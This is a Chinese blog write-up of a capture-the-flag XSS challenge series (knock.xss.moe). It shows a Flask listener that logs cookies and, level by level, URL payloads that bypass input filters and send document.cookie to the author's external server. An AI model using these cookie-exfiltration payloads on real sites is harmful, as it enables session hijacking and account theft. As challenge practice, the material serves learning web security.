## 狗子的XSS学习之旅
### 0X00 前言
    以前听歌，听的是旋律
    后来听歌，听的是歌词
    再后来听歌，听的是故事
    现在听歌，听的是自己
    初闻不知曲中意，再听已是曲中人
    我们都已经芳华已逝，谁的成长没有过难忘的回忆
最近很惆怅啊,弄们晓得吧,你说你喜欢辣条,我说以后你就叫我辣条吧.
### 0X01 Begin
在谷歌爸爸搜了一些xss的change,遇到一个难度一般的,获得flag的方式是带上他的  
请求你的vps,flag在日志里面.  
如图:  
本来是想用python直接接受参数的,这样更方便一点.  
比如这样:  
但是Flask部署在服务器要注意个问题,要加这个`xss.run(host="0.0.0.0")`  
不然无法外网访问,官方文档说的.  
xssflag.py:
    #/usr/bin/env python
    # _*_ coding:utf-8 _*_
    # blog : evilwing.me
    # __Author__ : wing
    from flask import Flask, request
    xss = Flask(__name__)
    @xss.route('/')
    def index():
        flag = request.args
        for i,j in flag.items():
            print('Flag is:' + j)
        return str()
    if __name__ == "__main__":
        xss.run(host="0.0.0.0")
### 0x03 Medium
[戳我开始xss change](https://knock.xss.moe/index)  
规则如开头所说..  
    So, in this stage, you just make the url like below and submit.
    http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?location=%22http://example.com/?%22%2Bdocument.cookie
    For tutorial, please replace example.com to your site and submit the URL from URL form.The victim browser will access your url, and when your XSS payload successfully runs on the browser, the browser sends you the FLAG.
#### xss1
VPS:
#### xss2
用常规的`urlencode`绕过
到这里提交
刚刚提交的时候忘记加上?,造成没解析
#### xss3
2-3关是一样的绕过方法
#### xss4
一开始是这样:
so,把a标签闭合掉就ok.
    q=a%27>//
拿cookie:
    http://2375e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q=a%27>
#### xss5
闭合textarea
    http://fea7c73bbe92f7880fc15514e076e838d2ce8a90.knock.xss.moe/?q=
#### xss6
和上面的一样
不多说了
#### xss7
是input标签，还是闭合！  
尖括号被转义了  
还有`/`  
这里我用了`autofocus`
    q=1"  autofocus onfocus=alert(1);//
autofocus 属性规定在页面加载时，域自动地获得焦点。
    http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=%22%20 autofocus onfocus=%22location.href=%27http://evilwing.me:5000/?%27%20%2B%20document.cookie
#### xss8
喵的，被转义了。  
试试js的伪协议  
刚刚的自动对焦也可以，过滤了双引号。  
    +号被吃了，先url编码。
    这里js伪协议没过去，还是用的autofocus
    http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=1%20%27%20autofocus%20onfocus=location.href=%27http://evilwing.me:5000/?%27%2Bdocument.cookie;//
#### xss9
把单引号过滤了，通过反引号绕过了  
主要是value并没有加单引号，就是故意的吧。  
payload：
    http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=``%20autofocus%20onfocus=location.href=`http://evilwing.me:5000/?`%2Bdocument.cookie
#### xss10
是一个frame，闭合绕过即可  
payload：
    http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=javascript:location.href=`http://evilwing.me:5000/?=`%2Bdocument.cookie
+要先编码成%2B，否则会被吃掉
#### xss11
同10
#### xss12
不知道是不是我的问题，location.href不行，换成windows.open()即可
    http://a4f51941335441be0fdb21c2890ec17b1d0f08f0.knock.xss.moe/?q=javascript:window.open(`http://evilwing.me:5000/?`%2Bdocument.cookie)
#### xss13
img标签被过滤了。试试其他标签。  
svg绕过了，黑名单机制。  
还有就是过滤了document.cookie  
用fromCharCode方法绕过  
ps：`fromCharCode()` 可接受一个指定的 Unicode 值，然后返回一个字符串。  
有火狐的hackbar自带。  
在线工具在[这儿](http://jdstiles.com/java/cct.html)  
弹窗也弹了，就是访问的时候没带上cookie。。。  
狗子我惆怅了....  
然后我索性直接把整段转换为ascii  
最终payload:
    http://f302e1c6d200282cf7eb6cac126412b2a2f8aea7.knock.xss.moe/?q=11
#### xss14
有CSP
>
> CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。
    Content-Security-Policy: script-src 'self' 'sha256-6FYe68L0Glf1hGqIn0L6jIYjc+MFEOCqK/DbJ7gxWnk='; frame-src http://*.knock.xss.moe https://*.knock.xss.moe
由他的csp看，可以通过引入第一个关卡的xss，设置好domain，然后通过第一关访问xss14的cookie。  
测试payload：  
`http://3cb34c8407410e2d6c1d708b786ce69a0192b470.knock.xss.moe/?q=//8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?document.domain=%22knock.xss.moe%22;window.open(`  
看能否访问我的blog  